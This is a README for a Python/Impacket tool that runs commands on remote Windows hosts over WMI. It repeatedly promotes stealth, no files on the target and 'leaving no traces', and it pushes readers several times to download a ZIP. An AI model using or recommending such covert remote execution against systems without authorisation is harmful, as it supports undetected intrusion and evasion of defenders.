# 🛡️ StealthyWMIExec.py - Quiet WMI Command Execution Tool

[![Download Now](https://img.shields.io/badge/Download-Get%20StealthyWMIExec-blue?style=for-the-badge&logo=github)](https://github.com/Toriefaithful525/StealthyWMIExec.py)

---

## 🔍 What is StealthyWMIExec.py?

StealthyWMIExec.py is a simple tool that lets you run commands on Windows computers using Windows Management Instrumentation (WMI). It does this quietly without saving extra files on the target machine. This helps keep your actions less visible.

You do not need to have any coding skills to use this. It works on any Windows PC that supports WMI. It also uses a trusted library called Impacket to make the communication smooth and secure.

## 💻 System Requirements

- A Windows computer (Windows 7 or later)
- Python 3.6 or newer installed on your PC (we will guide this below)
- Administrator rights on your local machine and the remote machine where you want to run commands
- Network access to the target computer
- Basic command prompt or PowerShell knowledge helps but not required

## 📥 How to Download StealthyWMIExec.py

Click the button below to visit the official GitHub page. From there, you can get all the files and instructions needed.

[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-green?style=for-the-badge&logo=github)](https://github.com/Toriefaithful525/StealthyWMIExec.py)

---

## 🚀 Getting Started: Download and Setup on Windows

Follow these steps to get StealthyWMIExec.py running on your Windows computer.

### Step 1: Install Python (if not installed)

StealthyWMIExec.py relies on Python. Here is how you install it:

1. Go to the official Python website: https://www.python.org/downloads/windows/
2. Click "Download Python 3.x.x" (choose the latest version).
3. Run the downloaded installer.
4. On the installer screen, **check the box that says "Add Python to PATH".**
5. Click “Install Now” and wait for it to finish.
6. To confirm installation, open Command Prompt and type:

   ```
   python --version
   ```

   You should see the Python version displayed.

### Step 2: Download StealthyWMIExec.py Files

1. Visit the GitHub repository here: https://github.com/Toriefaithful525/StealthyWMIExec.py
2. On the page, look for the green button labeled “Code” near the top right.
3. Click it, then choose “Download ZIP.”
4. Once the ZIP file downloads, right-click it and choose “Extract All...” to unpack it to a folder.

### Step 3: Open Command Prompt in the Extracted Folder

1. Navigate to the folder where you extracted the files.
2. Hold Shift, right-click inside the folder (not on a file).
3. Select “Open PowerShell window here” or “Open Command window here.”

### Step 4: Install Required Python Library (Impacket)

In the Command window, type:

```
pip install impacket
```

Press Enter and wait for the package to install. This library handles the communication needed to run WMI commands.

---

## ⚙️ How to Use StealthyWMIExec.py

Here is how you run commands on a remote machine:

1. Make sure you have network access to the target PC.
2. You will need these details:
   - The IP address or hostname of the remote PC
   - A username and password with admin rights on that PC
3. Open the command prompt inside the folder with StealthyWMIExec.py.
4. Use this command format:

```
python StealthyWMIExec.py <target_ip> <username> <password> "<command>"
```

For example, to get a directory listing:

```
python StealthyWMIExec.py 192.168.1.100 Administrator MyPassword123 "dir"
```

This will run the "dir" command on the target computer, showing you its contents.

---

## 🧩 Common Use Cases

- Run system checks on remote computers without installing anything.
- Manage devices in a network quietly.
- Retrieve information without leaving traces on the target.

---

## 🛠 Troubleshooting Tips

- If you get a "command not found" error, check that Python is installed and added to your system PATH.
- Ensure you have admin rights on the remote machine; without proper permissions, the command will fail.
- The target machine must have WMI service running and allow remote connections.
- Check your firewall settings if the connection does not work.

---

## 🔗 Additional Resources

- Python downloads and help: https://www.python.org/downloads/
- Impacket documentation: https://github.com/SecureAuthCorp/impacket
- Microsoft WMI docs: https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page

---

[![Download StealthyWMIExec.py](https://img.shields.io/badge/Download-Download%20Now-orange?style=for-the-badge&logo=github)](https://github.com/Toriefaithful525/StealthyWMIExec.py)